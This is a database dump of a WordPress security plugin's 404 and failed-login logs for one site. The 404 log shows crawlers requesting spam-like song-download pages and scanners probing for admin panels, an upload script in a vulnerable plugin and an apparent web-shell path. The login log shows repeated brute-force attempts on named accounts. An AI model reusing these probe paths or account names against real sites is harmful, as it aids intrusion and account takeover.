INSERT INTO `cmrfu_aiowps_events` VALUES("10781","404","","0","2017-02-03 12:19:22","157.55.39.231","","/stds/guru-gar-lava-lana-mp3song.com.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10782","404","","0","2017-02-03 13:11:56","40.77.167.18","","/stds/ek-vaari-ha-kehde-song-free-download.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10783","404","","0","2017-02-03 13:29:57","66.249.66.37","","/stds/accident-doubs-10.10.2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10784","404","","0","2017-02-03 13:30:05","66.249.66.43","","/stds/zomba-rural-passlist-msce.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10785","404","","0","2017-02-03 13:30:22","66.249.66.40","","/stds/phim-toi-thap-ki-tap-cuoi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10786","404","","0","2017-02-03 13:32:36","40.77.167.87","","/stds/remo-movie-dialo.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10787","404","","0","2017-02-03 14:08:36","66.249.66.40","","/foa/rohel.php?hl=bairava-songs-lyrics-videos","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10788","404","","0","2017-02-03 15:24:29","66.249.66.43","","/foa/rohel.php?hl=nee-varuvai-yena-hindhi-ser","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10789","404","","0","2017-02-03 17:07:25","66.249.66.37","","/roplt4/star-jalsha-tv-serial-notok-downlo.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10790","404","","0","2017-02-03 17:37:46","66.249.66.37","","/roplt4/ye-dil-hai-mushakil-movies-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10791","404","","0","2017-02-03 18:34:04","91.200.12.60","http://www.google.com/","/wp-content/plugins/wp-levoslideshow/js/swfupload/js/upload.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10792","404","","0","2017-02-03 18:38:43","157.55.39.231","","/stds/cach-nhan-co-de-ngoc-rong-1.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10793","404","","0","2017-02-03 19:11:41","66.249.66.40","","/foa/rohel.php?hl=free-download-song-nashe-si","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10794","404","","0","2017-02-03 20:00:30","40.77.167.87","","/stds/ko-tujhe-u-pyar-krega.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10795","404","","0","2017-02-03 20:23:36","204.79.180.91","http://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10796","404","","0","2017-02-03 20:27:27","66.249.66.40","","/foa/rohel.php?hl=Www.2d-magnum-29-10-2016.com","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10797","404","","0","2017-02-03 20:32:39","66.249.66.40","","/roplt4/sanchi-mobail-rington.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10798","404","","0","2017-02-03 21:32:48","66.249.66.133","","/stds/presentation-du-tour-2017.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10799","404","","0","2017-02-03 21:33:09","66.249.66.133","","/stds/hg-582-din-10-august-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10800","404","","0","2017-02-03 21:33:38","66.249.66.141","","/stds/palio-1999-1.5completo-bh.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10801","404","","0","2017-02-03 21:36:13","66.249.66.137","","/stds/pawan-singh-saan-h-kasmil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10802","404","","0","2017-02-03 21:43:31","66.249.66.137","","/foa/rohel.php?hl=ar-dil-ha-all-song-mp3-downl","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10803","404","","0","2017-02-03 21:53:43","66.249.66.166","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10804","404","","0","2017-02-03 22:59:10","66.249.66.133","","/foa/rohel.php?hl=sudha-sinha-chhath-puja-song","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10805","404","","0","2017-02-03 23:37:20","212.47.247.88","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10806","404","","0","2017-02-03 23:37:22","212.47.247.88","","/theme/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10807","404","","0","2017-02-03 23:37:25","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10808","404","","0","2017-02-03 23:37:36","212.47.247.88","","/graphics/banner.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10809","404","","0","2017-02-03 23:37:38","212.47.247.88","","/login.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10810","404","","0","2017-02-03 23:37:40","212.47.247.88","","/login.php?op=login","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10811","404","","0","2017-02-03 23:37:49","212.47.247.88","","/project.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10812","404","","0","2017-02-03 23:37:54","212.47.247.88","","/cp.php?m=login","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10813","404","","0","2017-02-03 23:37:56","212.47.247.88","","/theme/images/back-all.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10814","404","","0","2017-02-03 23:37:58","212.47.247.88","","/theme/header.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10815","404","","0","2017-02-03 23:38:05","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10816","404","","0","2017-02-03 23:38:10","212.47.247.88","","/p4n3l.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10817","404","","0","2017-02-03 23:38:12","212.47.247.88","","/cp.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10818","404","","0","2017-02-03 23:38:15","212.47.247.88","","/theme/images/back-all.jpg","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10819","404","","0","2017-02-03 23:38:16","212.47.247.88","","/theme/header.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10820","404","","0","2017-02-03 23:38:24","212.47.247.88","","/back.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10821","404","","0","2017-02-03 23:38:58","212.47.247.88","","/public/css/app.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10822","404","","0","2017-02-03 23:39:10","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10823","404","","0","2017-02-03 23:39:12","212.47.247.88","","/main.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10824","404","","0","2017-02-03 23:39:13","212.47.247.88","","/submit.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10825","404","","0","2017-02-03 23:39:15","212.47.247.88","","/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10826","404","","0","2017-02-03 23:39:22","212.47.247.88","","/includes/design/images/favicon.ico","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10827","404","","0","2017-02-03 23:39:23","212.47.247.88","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10828","404","","0","2017-02-03 23:39:26","212.47.247.88","","/assets/img/favicon.ico","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10829","404","","0","2017-02-03 23:39:27","212.47.247.88","","/theme/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10830","404","","0","2017-02-03 23:39:35","212.47.247.88","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10831","404","","0","2017-02-03 23:39:37","212.47.247.88","","/files","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10832","404","","0","2017-02-03 23:39:38","212.47.247.88","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10833","404","","0","2017-02-03 23:39:44","212.47.247.88","","/post/echo","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10834","404","","0","2017-02-03 23:39:46","212.47.247.88","","/path/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10835","404","","0","2017-02-03 23:39:48","212.47.247.88","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10836","404","","0","2017-02-03 23:39:53","212.47.247.88","","/files","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10837","404","","0","2017-02-03 23:39:55","212.47.247.88","","/%20img/back","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10838","404","","0","2017-02-03 23:39:57","212.47.247.88","","/img/flags","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10839","404","","0","2017-02-03 23:40:02","212.47.247.88","","/img/softs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10840","404","","0","2017-02-03 23:40:04","212.47.247.88","","/img/back/hawk-clip-art-HAWK03.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10841","404","","0","2017-02-03 23:40:09","212.47.247.88","","/img/logo.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10842","404","","0","2017-02-03 23:40:10","212.47.247.88","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10843","404","","0","2017-02-03 23:40:11","212.47.247.88","","/files","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10844","404","","0","2017-02-03 23:40:12","212.47.247.88","","/%20img/back","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10845","404","","0","2017-02-03 23:40:16","212.47.247.88","","/img/flags","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10846","404","","0","2017-02-03 23:40:17","212.47.247.88","","/img/softs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10847","404","","0","2017-02-03 23:40:19","212.47.247.88","","/img/back/hawk-clip-art-HAWK03.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10848","404","","0","2017-02-03 23:40:22","212.47.247.88","","/img/logo.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10849","404","","0","2017-02-03 23:40:24","212.47.247.88","","/home.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10850","404","","0","2017-02-03 23:40:28","212.47.247.88","","/img/logo.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10851","404","","0","2017-02-03 23:40:32","212.47.247.88","","/include/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10852","404","","0","2017-02-03 23:40:34","212.47.247.88","","/js/main.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10853","404","","0","2017-02-03 23:40:38","212.47.247.88","","/img/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10854","404","","0","2017-02-03 23:40:41","212.47.247.88","","/images/favicon.ico","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10855","404","","0","2017-02-03 23:40:42","212.47.247.88","","/gate.php?request=true","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10856","404","","0","2017-02-03 23:40:47","212.47.247.88","","/api.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10857","404","","0","2017-02-03 23:40:51","212.47.247.88","","/data/login.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10858","404","","0","2017-02-03 23:40:52","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10859","404","","0","2017-02-03 23:40:55","212.47.247.88","","/panel/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10860","404","","0","2017-02-03 23:40:56","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10861","404","","0","2017-02-03 23:40:59","212.47.247.88","","/android/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10862","404","","0","2017-02-03 23:41:01","212.47.247.88","","/ufr.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10863","404","","0","2017-02-03 23:41:03","212.47.247.88","","/admin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10864","404","","0","2017-02-03 23:41:05","212.47.247.88","","/img","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10865","404","","0","2017-02-03 23:41:08","212.47.247.88","","/img/banners","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10866","404","","0","2017-02-03 23:41:09","212.47.247.88","","/img","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10867","404","","0","2017-02-03 23:41:10","212.47.247.88","","/img/banners","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10868","404","","0","2017-02-03 23:41:13","212.47.247.88","","/gate.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10869","404","","0","2017-02-03 23:41:16","212.47.247.88","","/img","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10870","404","","0","2017-02-03 23:41:19","212.47.247.88","","/img/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10871","404","","0","2017-02-03 23:41:30","212.47.247.88","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10872","404","","0","2017-02-03 23:41:34","212.47.247.88","","/css/table_view.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10873","404","","0","2017-02-03 23:41:36","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10874","404","","0","2017-02-03 23:41:37","212.47.247.88","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10875","404","","0","2017-02-03 23:53:29","66.249.66.137","","/stds/tani-jaye-se-pahile-khal-ho-othlali-me-roti-bor-ke-song-mp3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10876","404","","0","2017-02-04 01:06:54","40.77.167.87","","/stds/download-kumpulan-lagu-new-palapa-liv-gwk.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10877","404","","0","2017-02-04 01:07:27","66.63.173.153","http://www.herkonyapi.com/wp-content/themes/metro-rate/db.php","/wp-content/themes/metro-rate/db.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10878","404","","0","2017-02-04 01:30:53","66.249.66.133","","/foa/rohel.php?hl=Ek-Dil-Mubarak-song-download","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10879","404","","0","2017-02-04 01:50:39","66.249.66.141","","/roplt4/jio-join-old-verge--downlo.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10880","404","","0","2017-02-04 02:44:19","66.249.66.43","","/foa/rohel.php?hl=ae-dil-hai-mushkil-hindi-mp4","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10881","404","","0","2017-02-04 02:45:11","66.249.66.37","","/foa/rohel.php?hl=mere-sath-tum-raho-fullmp3-so","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10882","404","","0","2017-02-04 02:52:38","66.249.66.43","","/foa/rohel.php?hl=kaun-tujhe-pyar-karege--ri.g","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10883","404","","0","2017-02-04 02:53:00","66.249.66.37","","/foa/rohel.php?hl=free-download-song-of-befekri","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10884","404","","0","2017-02-04 02:56:50","66.249.66.40","","/foa/rohel.php?hl=sajna-ji-sekahe-brak-up-kar-l","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10885","404","","0","2017-02-04 03:01:02","66.249.66.40","","/foa/rohel.php?hl=a-dil-h-musk-wapking-hd-video","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10886","404","","0","2017-02-04 04:16:41","66.249.66.40","","/foa/rohel.php?hl=ye-dil.h-mushkil-ke-video-song","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10887","404","","0","2017-02-04 04:31:01","66.249.66.43","","/stds/mp3-song-bullet-to-rkhi-h.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10888","404","","0","2017-02-04 04:31:20","66.249.66.40","","/stds/bhawani-mai-kalkatte-vali.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10889","404","","0","2017-02-04 04:31:57","66.249.66.40","","/stds/phi-nhung-di-chua-dot-quy.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10890","404","","0","2017-02-04 04:32:37","66.249.66.37","","/stds/alingnala-marathi-dj-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10891","404","","0","2017-02-04 05:21:49","204.79.180.207","http://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10892","404","","0","2017-02-04 05:32:29","66.249.66.37","","/foa/rohel.php?hl=kashmir-hamar-jaan-mp3-song-dj","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10893","404","","0","2017-02-04 06:48:15","66.249.66.43","","/foa/rohel.php?hl=-NashesichadgaiMP3songdownload","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10894","404","","0","2017-02-04 08:04:07","66.249.66.37","","/foa/rohel.php?hl=Nashe-di-chad-gyi-song-downlod","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10895","404","","0","2017-02-04 09:18:57","66.249.66.40","","/roplt4/download-lavan-full-hd-video.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10896","404","","0","2017-02-04 09:19:48","66.249.66.43","","/foa/rohel.php?hl=ve-man-phli-var-te-russi-c-mp3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10897","404","","0","2017-02-04 10:36:07","66.249.66.43","","/foa/rohel.php?hl=dolby-valya-bola-ho-majya-dj-la","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10898","404","","0","2017-02-04 10:38:39","66.249.66.43","http://www.herkonyapi.com/sfq/glnoa.php?hl=Foto-daniel-padilla-sama-cewek-ya","/css/p3w.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10899","404","","0","2017-02-04 10:38:48","66.249.66.40","http://www.herkonyapi.com/lui/glnoa.php?hl=sygic-android-serials-crack","/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10900","404","","0","2017-02-04 11:14:49","66.249.66.40","","/roplt4/lava-leniya-mp3-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10901","404","","0","2017-02-04 11:51:22","66.249.66.43","","/foa/rohel.php?hl=chana-mere-a-song-free-download","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10902","404","","0","2017-02-04 12:18:46","66.249.66.63","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10903","404","","0","2017-02-04 12:34:06","66.249.66.63","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10904","404","","0","2017-02-04 12:41:30","66.249.66.43","http://www.herkonyapi.com/sfq/glnoa.php?hl=ese-na-dekh-pgli-pyar-ho-jayega-mg-mp3-sku","/styles.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10905","404","","0","2017-02-04 13:07:09","66.249.66.43","","/foa/rohel.php?hl=patna-ke-ghat-par-kareli-barati","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10906","404","","0","2017-02-04 13:08:10","66.249.66.40","http://www.herkonyapi.com/sfq/glnoa.php?hl=darasa--maziki-na-maisha","/_global/css/photoswipe.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10907","404","","0","2017-02-04 13:08:11","66.249.66.43","http://www.herkonyapi.com/sfq/glnoa.php?hl=darasa--maziki-na-maisha","/_global/css/style.beta2.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10908","404","","0","2017-02-04 14:23:00","66.249.66.43","","/foa/rohel.php?hl=nashe-shi-cadgayi-song-download","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10909","404","","0","2017-02-04 14:48:26","66.249.66.63","","/stds/patch-pes-2017-bles-02237.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10910","404","","0","2017-02-04 14:48:29","66.249.66.43","","/stds/mid-week-jackpot-this-week.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10911","404","","0","2017-02-04 14:48:46","66.249.66.40","","/stds/ek-vari-haan-karde-mundiya.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10912","404","","0","2017-02-04 14:50:31","66.249.66.43","","/stds/doan-van-noi-ve-nha-truong.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10913","404","","0","2017-02-04 15:17:43","77.222.61.126","http://herkonyapi.com/wp-content/plugins/smtp-mailer/languages/diff95.php","/wp-content/plugins/smtp-mailer/languages/diff95.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10914","404","","0","2017-02-04 15:18:21","91.134.248.253","http://herkonyapi.com/wp-content/plugins/smtp-mailer/languages/diff95.php","/wp-content/plugins/smtp-mailer/languages/diff95.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10915","404","","0","2017-02-04 15:19:30","150.214.142.254","http://herkonyapi.com/wp-content/plugins/smtp-mailer/languages/diff95.php","/wp-content/plugins/smtp-mailer/languages/diff95.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10916","404","","0","2017-02-04 15:21:05","184.168.193.157","http://herkonyapi.com/wp-content/plugins/smtp-mailer/languages/diff95.php","/wp-content/plugins/smtp-mailer/languages/diff95.php","","");


DROP TABLE IF EXISTS `cmrfu_aiowps_failed_logins`;

CREATE TABLE `cmrfu_aiowps_failed_logins` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `user_login` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_login_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `login_attempt_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1236 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1","1","herkon123","2016-12-14 22:23:47","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("2","1","herkon123","2016-12-14 22:23:52","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("3","0","admin","2016-12-16 02:22:27","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("4","0","admin","2016-12-16 02:22:34","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("5","0","admin","2016-12-16 02:25:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("6","0","admin","2016-12-16 02:25:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("7","0","admin","2016-12-16 02:25:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("8","0","admin","2016-12-16 02:25:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("9","0","admin","2016-12-16 02:30:50","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("10","0","admin","2016-12-16 02:30:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("11","0","admin","2016-12-16 02:39:22","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("12","0","admin","2016-12-16 02:41:34","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("13","0","admin","2016-12-16 02:44:31","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("14","0","admin","2016-12-16 02:47:12","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("15","0","admin","2016-12-16 02:47:19","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("16","0","admin","2016-12-16 02:49:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("17","0","admin","2016-12-16 02:49:50","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("18","0","admin","2016-12-16 02:55:19","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("19","0","admin","2016-12-16 02:55:24","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("20","0","admin","2016-12-16 02:57:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("21","0","admin","2016-12-16 03:03:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("22","0","admin","2016-12-16 03:03:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("23","0","admin","2016-12-16 03:05:37","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("24","0","admin","2016-12-16 03:05:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("25","0","admin","2016-12-16 03:19:32","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("26","0","admin","2016-12-16 03:22:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("27","0","admin","2016-12-16 03:22:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("28","0","admin","2016-12-16 03:25:07","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("29","0","admin","2016-12-16 03:25:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("30","0","admin","2016-12-16 03:27:50","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("31","0","admin","2016-12-16 03:27:54","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("32","0","admin","2016-12-16 03:36:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("33","0","admin","2016-12-16 03:36:23","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("34","0","admin","2016-12-16 03:38:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("35","0","admin","2016-12-16 03:38:44","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("36","0","admin","2016-12-16 03:41:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("37","0","admin","2016-12-16 03:43:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("38","0","admin","2016-12-16 03:44:04","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("39","0","admin","2016-12-16 03:52:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("40","0","admin","2016-12-16 03:52:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("41","0","admin","2016-12-16 03:56:26","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("42","0","admin","2016-12-16 03:56:27","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("43","0","admin","2016-12-16 03:59:02","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("44","0","admin","2016-12-16 03:59:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("45","0","admin","2016-12-16 04:04:30","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("46","0","admin","2016-12-16 04:04:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("47","0","admin","2016-12-16 04:09:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("48","0","admin","2016-12-16 04:09:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("49","0","admin","2016-12-16 04:14:12","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("50","0","admin","2016-12-16 04:16:22","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("51","0","admin","2016-12-16 04:16:28","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("52","0","admin","2016-12-16 04:18:31","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("53","0","admin","2016-12-16 04:18:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("54","1","herkon123","2016-12-16 04:30:05","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("55","5","demouser","2016-12-16 04:30:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("56","1","herkon123","2016-12-16 04:30:11","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("57","5","demouser","2016-12-16 04:30:11","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("58","5","demouser","2016-12-16 04:35:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("59","5","demouser","2016-12-16 04:40:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("60","1","herkon123","2016-12-16 04:40:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("61","1","herkon123","2016-12-16 04:40:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("62","1","herkon123","2016-12-16 04:50:31","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("63","1","herkon123","2016-12-16 04:50:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("64","5","demouser","2016-12-16 04:55:45","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("65","1","herkon123","2016-12-16 04:55:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("66","5","demouser","2016-12-16 04:55:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("67","1","herkon123","2016-12-16 04:55:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("68","5","demouser","2016-12-16 05:00:55","91.210.146.*");
